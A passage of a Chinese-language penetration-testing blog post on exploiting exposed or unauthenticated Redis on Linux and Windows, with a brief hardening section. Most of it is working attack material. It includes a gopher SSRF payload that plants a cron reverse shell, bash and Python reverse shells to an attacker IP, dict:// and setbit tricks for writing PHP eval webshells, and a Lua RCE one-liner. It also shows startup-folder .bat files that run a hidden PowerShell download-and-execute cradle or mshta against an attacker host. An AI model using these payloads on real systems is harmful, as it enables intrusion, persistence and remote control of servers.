+<p>gopher://<target_ip>:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-c%20%22sh%20-i%20%3E%26%20/dev/tcp/127.0.0.1/1234%200%3E%261%22%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A<br>nc -lvp 1234</p>
+<p>远程登录了redis，执行一下即可，和写 ssh key 一样。crontab 最小执行单位为1分钟</p>
+<p>flushall # 谨慎使用！（本地测试可以，实际渗透可能没这个命令，有也不要用<br>set reshell “\n\n* * * * * bash -i &gt; &amp; /dev/tcp/192.168.118.129/2333 0&gt;&amp;1\n\n”<br>config set dirr /var/spool/cron/<br>config set dbfilename root<br>save<br>nc -lvp 2333</p>
+<p>python 反弹<br>\n\n * * * * * python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.118.129”,2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’\n\n</p>
+<h4 id="场景四：主从复制RCE"><a href="#场景四：主从复制RCE" class="headerlink" title="场景四：主从复制RCE"></a>场景四：主从复制RCE</h4><p>影响版本：Redis 4.x/5.x (&lt;= 5.0.5)<br>漏洞类型：RCE<br>利用条件：未授权或者弱口令外网访问redis 服务<br>攻击思路：来自参考资料。</p>
+<p>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p>
+<p><img src="https://i.imgur.com/cLoUGX3.png"></p>
+<p>redis 5.0:</p>
+<p>redis 5.0 不允许在脚本中执行命令，即 不能使用CONFIG 命令去设置或者获取数据库的物理路径，但是我们仍然可以猜测dbfilename 。 PPT 作者给出了一种攻击思路：</p>
+<p><img src="https://i.imgur.com/SeNIJDt.jpg"></p>
+<p>redis 通过slaveof 设置主从状态。主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</p>
+<p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。</p>
+<p>复现过程<br>启动一个redis 5.0 的镜像<br><a target="_blank" rel="noopener" href="https://www.runoob.com/docker/docker-install-redis.html">https://www.runoob.com/docker/docker-install-redis.html</a></p>
+<p><img src="https://i.imgur.com/rUwcW6f.png"></p>
+<p>启动一个Redis Rogue Server<br>在使用之前，将恶意so 文件下载到.py 文件同目录下。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>默认的端口为 6379 默认vps 端口为21000<br><img src="https://i.imgur.com/lWGmVLx.png"></p>
+<p>这里我打了几次都是timeout。用kali 确信是可以直接远程连接我的vps 的redis服务的。这里是环境问题（腾讯云），网上也有些师傅没复习成功，后来用vps 复现成功了。</p>
+<p>关于主从复制RCE，原理更重要，其实打就是用别人的工具……</p>
+<h4 id="场景五：Lua-RCE"><a href="#场景五：Lua-RCE" class="headerlink" title="场景五：Lua RCE"></a>场景五：Lua RCE</h4><p>CVE-2015-4335</p>
+<p>影响版本：Redis before 2.8.21 and 3.x before 3.0.2</p>
+<p>漏洞危害：远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码</p>
+<p>Exploit: <a target="_blank" rel="noopener" href="https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py">https://github.com/QAX-A-Team/redis_lua_exploit/blob/master/redis_lua.py</a></p>
+<p>将147 行的 host 改为目标机器ip。</p>
+<p>获取反弹shell。</p>
+<p>eval “tonumber(‘/bin/bash -i &gt;&amp; /dev/tcp/192.168.91.1/2333 0&gt;&amp;1’, 8)” 0</p>
+<h4 id="场景六：缓冲区溢出-RCE"><a href="#场景六：缓冲区溢出-RCE" class="headerlink" title="场景六：缓冲区溢出 RCE"></a>场景六：缓冲区溢出 RCE</h4><p>CVE-2016-8339</p>
+<p>受影响的版本 3.2.x - 3.2.4</p>
+<p>漏洞类型：数组越界（数组下标越界导致溢出</p>
+<p>涉及二进制，参考：<a target="_blank" rel="noopener" href="https://bestwing.me/Redis-CVE-2016-8339-analysis.html">https://bestwing.me/Redis-CVE-2016-8339-analysis.html</a></p>
+<p>POC：config set client-output-buffer-limit “master 1094795585 1094795585 1094795585”</p>
+<h2 id="绕过-截断"><a href="#绕过-截断" class="headerlink" title="绕过 ? 截断"></a>绕过 ? 截断</h2><p>以下内容均转载自yulige的博客</p>
+<p>转义绕过<br>写入恶意代码：（&lt;? 等特殊符号需要转义，不然问号后面会导致截断无法写入）<br>dict://0:6379/set:shell:”\x3C\x3Fphp\x20echo$_GET[x]\x3B\x3F\x3E”</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ">https://mp.weixin.qq.com/s/vCZWTOmBg8k8gAE3yJfedQ</a><br><img src="https://i.imgur.com/je6ovIe.png"></p>
+<h3 id="主从复制绕过"><a href="#主从复制绕过" class="headerlink" title="主从复制绕过"></a>主从复制绕过</h3><p><a target="_blank" rel="noopener" href="http://yulige.top/?p=775#i-17">http://yulige.top/?p=775#i-17</a></p>
+<p>当？截断的时候可以使用主从复制的方法将key值从主节点复制过来。然后节点再执行备份数据库操作写入webshell。</p>
+<p>主节点</p>
+<p>127.0.0.1:4444&gt; set shell “”<br>OK<br>节点</p>
+<p>dict://0:6379/slaveof:127.0.0.1:4444<br>dict://0:6379/config:set:dir:/var/www/html<br>dict://0:6379/config:set:dbfilename:shell.php<br>dict://0:6379/save<br>dict://0:6379/slaveof:no:one<br>查看一下文件是成功写入shell了。</p>
+<p>当然了如果可以出外网也可以直接主从复制rce，这一点在前面就说过了。只要用python起一个服务去模拟redis的返回，并且在全量复制的时候把数据库文件替换成so文件即可。</p>
+<p>bitop 命令绕过<br>zer0pts CTF 2020 urlapp ：<a target="_blank" rel="noopener" href="https://hackmd.io/@theoldmoon0602/r1mltAWHL">https://hackmd.io/@theoldmoon0602/r1mltAWHL</a><br><img src="https://i.imgur.com/VW73I1v.png"></p>
+<p>该命令可将key 进行位运算，取结果进行保存。</p>
+<p>bitop 命令的详细文档：<a target="_blank" rel="noopener" href="https://redis.io/commands/bitop">https://redis.io/commands/bitop</a></p>
+<p>Available since 2.6.0.</p>
+<p>Time complexity: O(N)</p>
+<p>Perform a bitwise operation between multiple keys (containing string values) and store the result in the destination key.</p>
+<p>The BITOP command supports four bitwise operations: AND, OR, XOR and NOT, thus the valid forms to call the command are:</p>
+<p>BITOP AND destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP OR destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP XOR destkey srckey1 srckey2 srckey3 … srckeyN<br>BITOP NOT destkey srckey<br>image-20200627173823931<br>image-20200627173823931</p>
+<h3 id="setbit-命令绕过"><a href="#setbit-命令绕过" class="headerlink" title="setbit 命令绕过"></a>setbit 命令绕过</h3><p>既然想明白关键是?截断的话其实方法也很多，能操作key就可以。这里举出一个command setbit.</p>
+<p><a target="_blank" rel="noopener" href="https://www.runoob.com/redis/strings-setbit.html">https://www.runoob.com/redis/strings-setbit.html</a></p>
+<p>Redis Setbit 命令用于对 key 所储存的字符串值，设置或清除指定偏移量上的位(bit)。</p>
+<p>?的ascii是63，ascii62是&gt;，二进制分别是0b00011111和0b00011110。所以按照前面的payload稍微改一下就是.使用setbit改动一位二进制即可把字符变成?，从而可写入webshell。</p>
+<p>127.0.0.1:6379&gt; config set dir /var/www/html<br>OK<br>127.0.0.1:6379&gt; config set dbfilename shell.php<br>OK<br>127.0.0.1:6379&gt; set webshell “&lt;&gt;php @eval($_POST[1]);&gt;&gt;”<br>OK<br>127.0.0.1:6379&gt; setbit webshell 191 1<br>(integer) 0<br>127.0.0.1:6379&gt; setbit webshell 15 1<br>(integer) 0<br>127.0.0.1:6379&gt; save<br>OK<br>Windows 下Redis GetShell</p>
+<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>我们可以通过 redis 的配置文件设置密码参数，这样客户端连接到 redis 服务就需要密码验证，这样可以让你的 redis 服务更安全。</p>
+<p>我们可以通过以下命令查看是否设置了密码验证：</p>
+<p>127.0.0.1:6379&gt; CONFIG get requirepass</p>
+<ol>
+<li>“requirepass”</li>
+<li>“”<br>默认情况下 requirepass 参数是空的，这就意味着你无需通过密码验证就可以连接到 redis 服务。</li>
+</ol>
+<p>你可以通过以下命令来修改该参数：</p>
+<p>127.0.0.1:6379&gt; CONFIG set requirepass “runoob”<br>OK<br>127.0.0.1:6379&gt; CONFIG get requirepass</p>
+<ol>
+<li>“requirepass”</li>
+<li>“runoob”<br>设置密码后，客户端连接 redis 服务就需要密码验证，否则无法执行命令。</li>
+</ol>
+<p>AUTH 命令基本语法格式如下：</p>
+<p>127.0.0.1:6379&gt; AUTH password<br>127.0.0.1:6379&gt; AUTH “runoob”<br>OK<br>127.0.0.1:6379&gt; SET mykey “Test value”<br>OK<br>127.0.0.1:6379&gt; GET mykey<br>“Test value”<br>修改默认配置，设置访问密码为强密码。<br>port 修改redis使用的默认端口号</p>
+<p>bind 设定redis监听的专用IP</p>
+<p>requirepass 设定redis连接的密码</p>
+<p>rename-command CONFIG “”　 ＃禁用CONFIG命令</p>
+<p>rename-command info info2 #重命名info为info2</p>
+<p>设置防火墙策略，添加访问redis 白名单。<br>iptables -A input -s x.x.x.x -p tcp –dport 6379 -j ACCEPT<br>权限最小原则。<br>以低权限用户启动redis 服务</p>
+<p>禁用/重命名高危命令，如config , flushall, eval<br>redis 不暴露公网 bind 127.0.0.1 , protected-mode yes<br>修改authorized_keys文件的权限对拥有者只读，其他用户无权限<br>相关资料<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a> 解决无法远程连接Redis</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linjiqin/p/8608975.html">https://www.cnblogs.com/linjiqin/p/8608975.html</a> 复习一下docker</p>
+<p><a target="_blank" rel="noopener" href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html">https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/crontab.html</a> Crontab</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kismetv/p/9236731.html#t2">https://www.cnblogs.com/kismetv/p/9236731.html#t2</a> Redis 主从复制学习</p>
+<p><a target="_blank" rel="noopener" href="http://yulige.top/?p=775#_RCE">http://yulige.top/?p=775#_RCE</a> 一篇总结非常好并且全面的Redis 安全博文</p>
+<p>[<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]">https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1%20redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E5%86%99%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8A%20redis%204.x%20RCE%20%E5%AD%A6%E4%B9%A0/]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/07/29/%E5%AF%B9%E4%B8%80%E6%AC%A1">https://www.k0rz3n.com/2019/07/29/对一次</a> redis 未授权写入攻击的分析以及 redis 4.x RCE 学习/) 也是一篇超级棒的文章</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a> 未授权攻击Redis</p>
+<p><a target="_blank" rel="noopener" href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a> 主从复制攻击手法原理pdf</p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/975/">https://paper.seebug.org/975/</a> 主从复制攻击Redis</p>
+<p><a target="_blank" rel="noopener" href="https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://mntn0x.github.io/2019/08/02/Redis%E5%9F%BA%E4%BA%8E%E4%B8%BB%E4%BB%8E%E5%A4%8D%E7%8E%B0%E7%9A%84RCE%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/113116872">https://zhuanlan.zhihu.com/p/113116872</a></p>
+<p><a target="_blank" rel="noopener" href="https://joychou.org/web/phpssrf.htmld">https://joychou.org/web/phpssrf.htmld</a> SSRF</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/181599">https://www.anquanke.com/post/id/181599</a> SSRF 认证攻击Redis</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5665#toc-8">https://xz.aliyun.com/t/5665#toc-8</a> SSRF 攻击redis 的总结</p>
+<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2016/12/03/redis-getshell/#centos">https://lorexxar.cn/2016/12/03/redis-getshell/#centos</a> redis getsell 的一些思考</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd">https://mp.weixin.qq.com/s?__biz=Mzg4OTExMjE2Mw==&amp;mid=2247483746&amp;idx=1&amp;sn=5a2622e492335219440647d9b5453379&amp;chksm=cff1926ef8861b781b9dd8ac3e15f0098a7574791717e4958c6d8bc7ab19669d9d20912e2514&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1586525848516&amp;sharer_shareid=7e41844e30c25b110ea9dbbf7022e94d#rd</a> 细数redis 的几种getshell 方法</p>
+<p>相关工具<br>Redis + SSRF payload 生成：<br><a target="_blank" rel="noopener" href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a> 支持ReverseShell 和 PHPShell</p>
+<p>Redis 口令暴破<br><a target="_blank" rel="noopener" href="https://github.com/evilpacket/redis-sha-crack">https://github.com/evilpacket/redis-sha-crack</a></p>
+<p>Redis Rogue Server<br><a target="_blank" rel="noopener" href="https://github.com/LoRexxar/redis-rogue-server">https://github.com/LoRexxar/redis-rogue-server</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Dliv3/redis-rogue-server">https://github.com/Dliv3/redis-rogue-server</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<p>主从复制加载的恶意so 文件<br><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></p>
+<p>MSF 下的利用模块<br>auxiliary/scanner/redis/file_upload normal Redis File Upload</p>
+<p>auxiliary/scanner/redis/redis_login normal Redis Login Utility</p>
+<p>auxiliary/scanner/redis/redis_server normal Redis Command Execute Scanner</p>
+<p>漏洞挖掘<br>对 port:6379 搜索<br><a target="_blank" rel="noopener" href="https://www.zoomeye.org/searchResult?q=port:6379">https://www.zoomeye.org/searchResult?q=port:6379</a></p>
+<p>Fofa 关键字搜索<br>port=”6379” &amp;&amp; protocol==redis &amp;&amp; country=CN<br>对Web 网站的真实ip 进行全端口扫描 / 探测 redis</p>
+<hr>
+<h1 id="Windows下Redis-利用思路"><a href="#Windows下Redis-利用思路" class="headerlink" title="Windows下Redis 利用思路"></a>Windows下Redis 利用思路</h1><p>学了两天的Cobalt Strike 4.0 的基础使用和术语，继续把之前漏掉的Windows 下利用Redis 学习总结一下。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>太难了，Windows Server 2008 R2 我这里(VMware Fusion)没法用VMware Tools，Github（图片上github URL打错了） 又不能访问，机器上也没有Github。我是如何把Windows 版的Redis 弄上去的？哈哈（其实后面想了想还有其他办法，不过感觉也有点麻烦。</p>
+<p><img src="https://i.imgur.com/KRBRvS9.png"></p>
+<p><img src="https://i.imgur.com/39WhmIK.png"></p>
+<p>因为之前复现 MS17-010，CVE-2019-0708，开启了445 和 3389 。我这里用ms17-010 打过去，拿到了system 权限<br>用Cobalt Strike 生成上线 64 位的exe 可执行文件上线木马<br>MSF 上传木马并执行<br>Cobalt Strike 上2008 R2 成功 上线<br>然后也不能传目录（可以传压缩包，终于懂了为什么有些东西不能传文件夹了），但是相比用msf，这里可视化上传也是很不错了。<br><img src="https://i.imgur.com/HMYcnTZ.png"></p>
+<p><img src="https://i.imgur.com/A41ZMox.png"></p>
+<p>算是第一次同时使用Metasploit 和 Cobalt Strike。</p>
+<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>Redis-Server：Windows Server 2008 R2 x64<br>Attacker：Kali Linux<br>网络：NAT<br>IP：192.168.118.134，192.168.118.129<br>PhpStudy 2018 搭建 Web 服务,需要相关vc运行库<br>切换到对应的目录下，redi-server.exe redis.conf 即可启动redis-server 服务。<br><img src="https://i.imgur.com/U6Z4tkr.png"></p>
+<p>netstat -ano 查看端口开放情况<br><img src="https://i.imgur.com/UANrinf.png"></p>
+<p>可以看到，已经开启了 6379 Redis 服务。</p>
+<p>尝试连接一下<br><img src="https://i.imgur.com/n9gYmuj.png"></p>
+<p>ping 返回 PONG。成功远程未授权连接上Redis。（相比与Linux下复现，这里我没有修改任何redis.conf的内容，难道是说Windows下默认可以。</p>
+<h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>相比于Linux 下攻击Redis 未授权，Windows 下又有哪些可以利用的？Linux 下可以写入Webshell，Windows 下肯定也行。Linux 下可以写入SSH，导致SSH 远程登录目标机器，而Windows没有。</p>
+<h3 id="写入Webshell"><a href="#写入Webshell" class="headerlink" title="写入Webshell"></a>写入Webshell</h3><p>这种方法最容易想到，也相对来说有点鸡肋，因为必须要知道Windows 下搭建的Web 服务的网站物理路径，才能往里面写webshell，当然也可以猜测，或者专门去收集一些常见的网站物理路径位置。(这次我发现用PHPStudy2018 安装默认存在一个phpinfo.php，以及phpMyadmin)</p>
+<p><img src="https://i.imgur.com/ydL4RPh.png"></p>
+<p>不一会儿，有一个师傅走过来，问我在干嘛，我说在学打Redis…… 他说，你怎么又在打Redis。。。然后就讨论了一下(大概说了有五分钟左右，这里就说下讨论的结论），假设Windows 服务器下的Redis 肯定在内网，6379不出网，然后如果存在SSRF的点，那么用gopher 协议可能可以打一波 SSRF 攻击内网未授权，写入webshell，或者反弹shell啥的。但是，如何打入内网的问题似乎才是利用的关键，而我总结的这些感觉都是已经在内网了或者是拿到了一个未授权的访问了，如果没有SSRF似乎就没有办法了(就单独说从这一台机器。我想到一种，就是RCE修改redis.conf,然后让6379 暴露公网，然后做一个隐藏后门，感觉应该可以这样利用。当然，已经有RCE，那么肯定第一件是就是拿shell了，所以这个思路我觉得只能说是在后面权限持续控制的时候，当作一种思路罢了（感觉具体实现性的话也不是很行。晚上我又想到，可不可以利用信息泄漏，比如说内网ip信息泄漏啥的，来进入内网？其他方法，可以以后有想法了，再来研究研究。</p>
+<p>得到物理路径：C:/Users/Administrator/Desktop/PHPTutorial/WWW</p>
+<p>然后就和Linux 下写Webshell 差不多了，只是换了一下dir 路径，和换行符的区别，因为Windows 和 Linux 的换行符是不一样的。这里是Windows，所以是\r\n（也是一样，避免和原始数据混淆）</p>
+<p>192.168.118.134:6379&gt; config set dir C:/Users/Administrator/Desktop/PHPTutorial/WWW<br>OK<br>192.168.118.134:6379&gt; set webshell “\r\n<?php @eval($_POST[a]);?>\r\n”<br>OK<br>192.168.118.134:6379&gt; config set dbfilename webshell.php<br>OK<br>192.168.118.134:6379&gt; save<br>OK<br><img src="https://i.imgur.com/AxEyXv7.png"></p>
+<p>还发现了，这些操作，似乎都会被记录进redis 日志的。</p>
+<p><img src="https://i.imgur.com/guAkaO1.png"></p>
+<p>当然，使用shell 管理器，比如蚁剑是肯定能连上的。</p>
+<p>查看一下webshell.php<br>Redis 写文件会自动写入一行版本信息。然后再是我们写的东西。</p>
+<p><img src="https://i.imgur.com/BhlKVPY.png"></p>
+<p>说明了之前在学习Linux下利用redis写webshell的时候，其实不用flushall 也可以写webshell的，在新的一个dbfile 里面写入就行了。</p>
+<h3 id="写入启动项"><a href="#写入启动项" class="headerlink" title="写入启动项"></a>写入启动项</h3><p>“用户启动文件夹”和“系统启动文件夹”的区别：</p>
+<p>1、两者启动文件夹的路径不一样。用户开机启动文件夹，对应“开始菜单”-“程序”-“启动”功能，路径是：“C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup”；系统启动文件夹对应的路径是：“C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”。</p>
+<p>2、两者起到的功能不一样。举例说明：如果系统有admin和guest两个系统用户，admin使用方法一（用户启动文件夹）添加开机启动项，那么只有使用admin登录系统时，开机启动项才会起作用，guest用户登录系统不会自动启动；而使用方法二（系统启动文件夹）设置的开机启动项，在admin和guest登录系统时都会启动。</p>
+<p>写入启动项，大概有三种攻击路线，利用msf，CS，还有一个就是PS_Shell.rb 来上线。</p>
+<p>利用Cobalt Strike<br>当然也可以用 Metasploit。</p>
+<blockquote>
+<p>Attacks -&gt; Web Drive-by -&gt; Scripted Web Delivery，选择Powershell</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.118.129:80&#x2F;aaa&#39;))&quot;</span><br></pre></td></tr></table></figure>
+
+
+<p>然后和写入Webshell 一样的方式，将上面的payload 保存为.bat文件。这里因为payload里面有双引号，所以需要进行转义。</p>
+<p>bat（批处理）文件概念：在DOS和Windows 9x 操作系统家族中，批处理文件的文件扩展名为.bat。当运行批处理文件时，通常是cmd.exe，会读取文件中的内容，并逐行运行。</p>
+<p>192.168.118.146:6379&gt; config set dir “C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup”<br>OK<br>192.168.118.146:6379&gt; config set dbfilename config.bat<br>OK<br>192.168.118.146:6379&gt; set shell_bat “\r\n\r\npowershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a target="_blank" rel="noopener" href="http://192.168.118.129/aaa&#39;))\&quot;\r\n\r\n&quot;">http://192.168.118.129:80/aaa&#39;))\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>手动重启靶机。。可以发现主机上线了。（这里我中途去吃饭了，然后回来又看了一下关于SRC相关的东西，所以时间上看起来上线很晚，实际上，等开机之后过一会儿就上线了，可能这取决于目标系统的流畅度</p>
+<p><img src="https://i.imgur.com/QDxyT31.png"></p>
+<p>查看开机启动项<br><img src="https://i.imgur.com/TY3qpOp.png"></p>
+<p>确实成功写入，并且执行了。</p>
+<h3 id="利用mshta-PS-shell"><a href="#利用mshta-PS-shell" class="headerlink" title="利用mshta PS_shell"></a>利用mshta PS_shell</h3><p>利用的exploit：<a target="_blank" rel="noopener" href="https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb">https://github.com/starnightcyber/CVE-2017-11882/edit/master/PS_shell.rb</a></p>
+<p>在/usr/share/metasploit-framework/modules/exploits/windows下创建一个PS_shell.rb文件，将上面的内容填入进去。进入msfconsole 然后重新载入一下exploit，reload_all。</p>
+<p><img src="https://i.imgur.com/ugzwH85.png"></p>
+<p>然后运行mshta.exe “……” 就可以反弹shell了。</p>
+<p>这里就可以利用redis 未授权，写入启动项来运行，从而得到反弹shell。</p>
+<p>192.168.118.146:6379&gt; config set dir “C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup”<br>OK<br>192.168.118.146:6379&gt; config set dbfilename backup.bat<br>OK<br>192.168.118.146:6379&gt; set backup “\r\n\r\n mshta.exe &quot;<a target="_blank" rel="noopener" href="http://192.168.118.129:8080/tql/&quot;/r/n/r/n&quot;">http://192.168.118.129:8080/tql\&quot;\r\n\r\n&quot;</a><br>OK<br>192.168.118.146:6379&gt; save<br>OK<br>手动重启目标机器。。不过每次重启之后，还要切换成Administrator账户，才会收到session或者说上线。<br><img src="https://i.imgur.com/ZY8Ae2n.png"></p>
+<p><img src="https://i.imgur.com/VV6WV5W.png"></p>
+<p>关于 mshta.exe的科普：<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Mshta.exe/10666591">https://baike.baidu.com/item/Mshta.exe/10666591</a></p>
+<p><a target="_blank" rel="noopener" href="http://jincheng.xpcha.com/675nabeltqm/">http://jincheng.xpcha.com/675nabeltqm/</a></p>
+<p>英文全称Microsoft HTML Application，可用于执行.HTA 文件，是微软超文本标记语言应用。</p>
+<p>而在之前那个PS_Shell.rb 的源码中，利用的是 CVE-2017-11882，其中有一段注释</p>
+<p>This module generates an command to place within a word document, that when executed, will retrieve a HTA payload via HTTP from an web server. Currently have not figured out how to generate a doc.</p>
+<p>漏洞分析：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/87311">https://www.anquanke.com/post/id/87311</a> 漏洞类型：栈溢出漏洞导致内存损坏</p>
+<h3 id="写入MOF"><a href="#写入MOF" class="headerlink" title="写入MOF"></a>写入MOF</h3><p>环境必须为Windows 2003，比较久远的提权方法。这里不复现了，了解一下吧。如果有机会会用到，至少要知道。<br>mof是windows系统的一个文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。其就是用又了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof当中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
+<p>也就是说在c:/windows/system32/wbem/mof/目录下的mof文件会每5秒自动执行一次，这样就不需要重启机器就能获取权限了。</p>
+<p>这种利用方式不用重启目标机器，也不需要获取目标Web的物理路径，只是环境必须是Windows 2003</p>
+<h3 id="DLL-劫持"><a href="#DLL-劫持" class="headerlink" title="DLL 劫持"></a>DLL 劫持</h3><p>这种利用方法和下面的快捷方式覆写请参考R3start大佬的文章：<a target="_blank" rel="noopener" href="http://r3start.net/index.php/2020/05/25/717">http://r3start.net/index.php/2020/05/25/717</a></p>
+<h3 id="快捷方式覆写"><a href="#快捷方式覆写" class="headerlink" title="快捷方式覆写"></a>快捷方式覆写</h3><h2 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h2><p>参考上面的漏洞修复</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Windows下的利用思路，其实前两张和Linux下是一样的。甚至比Linux 下还鸡肋，毕竟Linux 下的web 目录是可以猜测的（就那么几个。写入MOF，前几天在先知社区也有人发了文章了，<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a></p>
+<p>DLL 劫持 和 快捷方式覆写领会思路和原理吧，不想复现了，最近事情太多了。（埋坑。</p>
+<p>另外，Linux 下还有如下利用方法：</p>
+<p>写入到/etc/profile.d/用户环境变量<br>开启AOF持久化纯文本记录appendfilename<br>这里，就先不研究了，感觉目前用不到，了解一下就行了。</p>
+<h2 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></p>
+<p><a target="_blank" rel="noopener" href="https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html">https://uknowsec.cn/posts/notes/Redis%E5%9C%A8Windows%E7%8E%AF%E5%A2%83%E4%B8%8BGetshell.html</a> Redis 在Windows 下 如何Getshell</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7940#toc-6">https://xz.aliyun.com/t/7940#toc-6</a> Redis Windows 踩坑</p>
+<p>换行符：<a target="_blank" rel="noopener" href="https://blog.csdn.net/CJF_iceKing/article/details/47836201">https://blog.csdn.net/CJF_iceKing/article/details/47836201</a></p>
+<p>Windows 开机启动项：<a target="_blank" rel="noopener" href="http://www.win10xiazai.com/win10/5334.html">http://www.win10xiazai.com/win10/5334.html</a></p>
